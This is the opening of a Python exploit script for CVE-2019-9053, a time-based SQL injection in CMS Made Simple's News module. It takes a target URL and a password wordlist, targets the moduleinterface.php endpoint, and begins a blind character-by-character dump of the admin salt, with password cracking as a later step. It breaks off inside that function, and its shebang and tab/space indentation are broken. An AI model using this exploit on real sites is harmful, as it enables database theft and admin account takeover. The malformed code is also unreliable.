#!/bin/bash/python3

import argparse
import os
import sys
import hashlib
import requests

def get_arguments():
	parser = argparse.ArgumentParser(description='cve 2019-9053->CMS Made Simple SQL Injection',usage=f'python3 {sys.argv[0]} --url websiteurl --wordlist wordlistpath --creck',epilog=f'EXAMPLE - python3 {sys.argv[0]} --url https://127.0.0.1/cms --wordlist /opt/rockyou.txt --creck')
	parser.add_argument('--url',metavar='Url',dest='url',help='Base target url')
	parser.add_argument('--wordlist',metavar='Wordlist',dest='wordlist',help='wordlist for creck admin password')
	parser.add_argument('--creck',dest='cracking',help='creck password with wordlist',action="store_true")

	args = parser.parse_args()

	if len(sys.argv) < 2:
		parser.print_usage()
		sys.exit(1)

	return args

args = get_arguments()

url = args.url
wordlist = args.wordlist

if not url:
	print("Specify an url target")
	sys.exit(1)

if not wordlist:
	print("Specify an wordlist")

elif not os.path.exists(wordlist):
    print("[+] File Does Not Exists")
    sys.exit()





url_vuln = url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()

dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'

flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""
salt = ''


def dump_Salt():
	global flag
	global salt
	global output
	ord_salt = ""
	ord_salt_temp = ""
	'''
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
    '''
    while flag:
    	flag = False
    	for i in range(0,len(dictionary)):
    		temp_salt = salt + dictionary[i]
    		ord_salt_temp = ord_salt + hex(ord(dictionary[i]))
    		
